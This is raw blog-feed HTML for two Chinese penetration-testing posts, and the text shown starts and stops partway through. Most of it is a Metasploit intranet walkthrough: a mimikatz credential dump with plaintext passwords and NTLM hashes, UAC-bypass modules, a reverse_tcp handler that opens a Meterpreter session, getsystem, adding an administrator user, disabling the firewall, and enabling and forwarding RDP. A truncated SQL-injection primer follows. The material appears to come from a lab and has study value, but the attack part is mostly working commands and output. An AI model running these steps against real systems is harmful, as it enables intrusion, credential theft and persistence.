class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz</span><br><span class="line"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#39;#####&#39;        &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com   ***&#x2F;</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line">Authentication Id : 0 ; 2499588 (00000000:00262404)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : 2020&#x2F;9&#x2F;3 13:38:09</span><br><span class="line">SID               : S-1-5-21-2952760202-1353902439-2381784089-500</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : 3333deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : 7d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : 1999118gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><h5 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h5><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h5 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h5><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h5><h6 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h6><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h6 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Metasploit使用&quot;&gt;&lt;a href=&quot;#Metasploit使用&quot; class=&quot;headerlink&quot; title=&quot;Metasploit使用&quot;&gt;&lt;/a&gt;Metasploit使用&lt;/h3&gt;&lt;h5 id=&quot;基础常用命令&quot;&gt;&lt;a href=&quot;#基础常用命令&quot;</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>SQL--SQL注入漏洞</title>
    <link href="http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/08/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-10-06T09:55:32.783Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当前数据库用户、数据库中的表等信息，也可以读取敏感文件、写入服务器shell，进而获取主机权限。</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>MySQL 5.0以上版本。</p><p>数据库</p><ul><li><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息。</p></li></ul><p>表</p><ul><li><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p></li><li><p><strong>TABLES</strong></p><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</p></li><li><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| TABLES                                |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">mysql&gt; desc TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(<span class="number">64</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(<span class="number">10</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(<span class="number">255</span>)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(<span class="number">2048</span>)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">mysql&gt; desc COLUMNS;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG            | varchar(<span class="number">512</span>)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA             | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| ORDINAL_POSITION         | bigint(<span class="number">21</span>) unsigned | NO   |     | <span class="number">0</span>       |       |</span><br><span class="line">| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |</span><br><span class="line">| IS_NULLABLE              | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(<span class="number">64</span>)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_OCTET_LENGTH   | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_PRECISION        | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| NUMERIC_SCALE            | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATETIME_PRECISION       | bigint(<span class="number">21</span>) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CHARACTER_SET_NAME       | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLLATION_NAME           | varchar(<span class="number">32</span>)         | YES  |     | NULL    |       |</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(<span class="number">3</span>)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(<span class="number">30</span>)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(<span class="number">80</span>)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_COMMENT           | varchar(<span class="number">1024</span>)       | NO   |     |         |       |</span><br><span class="line">| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line"><span class="number">21</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>总结</p><p>MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema的表schemata中的列schema_name记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表tables中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列table_schema记录了所有数据库的名字</span><br><span class="line">information_schema的表columns中的列table_name记录了所有数据库的表的名字</span><br><span class="line">information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</span><br></pre></td></tr></table></figure><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="right、left函数"><a href="#right、left函数" class="headerlink" title="right、left函数"></a>right、left函数</h5><p><code>LEFT()</code>函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，<strong>我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数</strong>。</p><p>right同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) 